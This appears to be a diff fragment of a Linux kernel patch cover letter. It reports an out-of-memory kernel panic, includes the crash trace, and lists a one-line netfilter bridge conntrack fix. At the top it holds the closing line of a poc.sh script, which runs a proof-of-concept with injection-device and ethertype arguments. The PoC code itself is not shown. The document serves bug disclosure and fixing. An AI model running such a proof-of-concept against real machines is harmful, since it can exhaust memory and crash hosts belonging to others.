+./poc "${INJECT_DEV}" "${THREADS}" "${ETHERTYPE}" "${SECONDS_TO_RUN}"
+
+------END poc.sh--------
+
+----BEGIN crash log----
+
+[  910.646493][T11638] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled
+[  910.647249][T11638] CPU: 3 UID: 0 PID: 11638 Comm: sshd-session Not tainted 6.12.95 #2
+[  910.647787][T11638] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  910.648584][T11638] Call Trace:
+[  910.648818][T11638]  <TASK>
+[  910.649025][T11638]  panic (build/../kernel/panic.c:108)
+[  910.649301][T11638]  ? dump_header (build/../mm/oom_kill.c:164 build/../mm/oom_kill.c:384 build/../mm/oom_kill.c:438 build/../mm/oom_kill.c:474)
+[  910.649617][T11638]  ? __pfx_panic (build/../kernel/panic.c:740)
+[  910.649968][T11638]  out_of_memory (build/../mm/oom_kill.c:292 build/../mm/oom_kill.c:1140)
+[  910.650302][T11638]  ? __alloc_pages_noprof (build/../mm/page_alloc.c:5168)
+[  910.650685][T11638]  ? __pfx_out_of_memory (build/../mm/oom_kill.c:835)
+[  910.651025][T11638]  ? lock_acquire (build/../kernel/locking/lockdep.c:5828)
+[  910.651329][T11638]  ? __alloc_pages_noprof (build/../mm/page_alloc.c:5168)
+[  910.651714][T11638]  __alloc_pages_noprof (build/../mm/page_alloc.c:5709 (discriminator 1))
+[  910.652151][T11638]  ? hlock_class+0x4e/0x130
+[  910.652516][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.652986][T11638]  ? __lock_acquire (build/../kernel/locking/lockdep.c:3760 build/../kernel/locking/lockdep.c:3855 build/../kernel/locking/lockdep.c:3876 build/../kernel/locking/lockdep.c:5237)
+[  910.653387][T11638]  ? __pfx___alloc_pages_noprof (build/../include/linux/signal.h:87)
+[  910.653878][T11638]  ? __pfx___lock_acquire (build/../kernel/locking/lockdep.c:4397 (discriminator 11))
+[  910.654307][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.654770][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.655212][T11638]  ? find_held_lock (build/../kernel/locking/lockdep.c:5350 (discriminator 1))
+[  910.655608][T11638]  alloc_pages_mpol_noprof+0x1ab/0x4d0
+[  910.656060][T11638]  ? __pfx_alloc_pages_mpol_noprof+0x10/0x10
+[  910.657215][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.657683][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.658137][T11638]  ? xas_load (build/../include/linux/xarray.h:1293 (discriminator 1) build/../lib/xarray.c:211 (discriminator 1) build/../lib/xarray.c:246 (discriminator 1))
+[  910.658493][T11638]  ? filemap_get_entry (build/../include/linux/rcupdate.h:836 build/../mm/filemap.c:1898)
+[  910.658922][T11638]  folio_alloc_noprof (build/../mm/mempolicy.c:2591)
+[  910.659310][T11638]  filemap_alloc_folio_noprof (build/../mm/filemap.c:1211)
+[  910.659750][T11638]  ? __pfx_filemap_alloc_folio_noprof (build/../include/linux/seqlock.h:228 (discriminator 2))
+[  910.660262][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.660727][T11638]  __filemap_get_folio+0x35b/0x7a0
+[  910.661152][T11638]  filemap_fault (build/../mm/filemap.c:3470 build/../mm/filemap.c:3547)
+[  910.661525][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.661916][T11638]  ? __pfx_filemap_fault (build/../arch/x86/include/asm/bitops.h:202 (discriminator 1))
+[  910.662291][T11638]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
+[  910.662648][T11638]  __do_fault (build/../mm/memory.c:5458)
+[  910.662956][T11638]  do_pte_missing+0x10c9/0x3710
+[  910.663291][T11638]  ? pte_offset_map_nolock+0x7a/0x170
+[  910.663679][T11638]  __handle_mm_fault (build/../include/linux/huge_mm.h:303 (discriminator 1) build/../mm/memory.c:6476 (discriminator 1))
+[  910.664035][T11638]  ? __pfx_lock_release (build/../kernel/locking/lockdep.c:238 (discriminator 9))
+[  910.664371][T11638]  ? down_read_trylock (build/../kernel/locking/rwsem.c:1613 (discriminator 1) build/../kernel/locking/rwsem.c:1607 (discriminator 1))
+[  910.664732][T11638]  ? lock_vma_under_rcu (build/../include/linux/err.h:92 (discriminator 1) build/../mm/mmap_lock.c:311 (discriminator 1))
+[  910.665081][T11638]  ? __pfx___handle_mm_fault (build/../mm/memory.c:4710)
+[  910.665470][T11638]  ? rcu_is_watching (build/../include/linux/context_tracking.h:128 (discriminator 1) build/../kernel/rcu/tree.c:752 (discriminator 1))
+[  910.665803][T11638]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  910.666194][T11638]  handle_mm_fault (build/../mm/memory.c:6710)
+[  910.666530][T11638]  do_user_addr_fault (build/../include/linux/mm.h:1538 (discriminator 1) build/../arch/x86/include/asm/mmu_context.h:271 (discriminator 1) build/../arch/x86/mm/fault.c:1079 (discriminator 1) build/../arch/x86/mm/fault.c:1329 (discriminator 1))
+[  910.666901][T11638]  exc_page_fault (build/../arch/x86/mm/fault.c:1471 (discriminator 2) build/../arch/x86/mm/fault.c:1527 (discriminator 2))
+[  910.667220][T11638]  asm_exc_page_fault (build/../arch/x86/include/asm/idtentry.h:618)
+[  910.667551][T11638] RIP: 0033:0x55e87d072fe9
+[  910.667868][T11638] Code: Unable to access opcode bytes at 0x55e87d072fbf.
+
+Code starting with the faulting instruction
+===========================================
+[  910.668333][T11638] RSP: 002b:00007fff829343c0 EFLAGS: 00010206
+[  910.668750][T11638] RAX: 0000000000000001 RBX: 000055e89bfa1840 RCX: 000055e87d0d3866
+[  910.669274][T11638] RDX: 0000000000000000 RSI: 0000000000000004 RDI: 000055e89bfafbf0
+[  910.669803][T11638] RBP: 00007fff82934410 R08: 0000000000000008 R09: 0000000000000000
+[  910.670324][T11638] R10: 00007fff829344a0 R11: 0000000000000202 R12: 0000000000000000
+[  910.670859][T11638] R13: 00007fff829344a0 R14: 000000000000038d R15: 0000000000000007
+[  910.671409][T11638]  </TASK>
+[  910.671825][T11638] Kernel Offset: disabled
+[  910.672195][T11638] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  netfilter: bridge: release template ct on non-IP path
+
+ net/bridge/netfilter/nf_conntrack_bridge.c | 1 +
+ 1 file changed, 1 insertion(+)
+
 -- 
 2.43.0
+
